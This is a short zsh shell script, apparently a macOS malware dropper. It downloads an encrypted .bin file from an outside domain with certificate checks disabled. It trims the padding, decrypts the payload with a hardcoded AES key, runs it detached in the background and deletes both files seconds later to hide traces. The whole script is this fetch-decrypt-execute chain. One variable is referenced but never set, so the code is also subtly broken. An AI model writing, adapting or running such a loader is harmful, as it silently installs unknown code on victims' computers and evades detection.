#!/bin/zsh
q8ym9=$(mktemp /tmp/5fntq2.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m19fac026a2c40953.bin" -o "$q8ym9z" || exit 1
bgcdgh=$(stat -f %z "$q8ym9z"); e8rtmdj=$(( bgcdgh - 689 - 3020 ))
tail -c +$(( 689 + 1 )) "$q8ym9z" | head -c $e8rtmdj | openssl enc -d -aes-256-cbc -k ae2ef3d49b61c8604bfd4aad -out "$q8ym9" 2>/dev/null
[ -s "$q8ym9" ] && chmod 700 "$q8ym9" && ( "$q8ym9" & ) && disown
( sleep 3; rm -f "$q8ym9" "$q8ym9z" ) &>/dev/null &
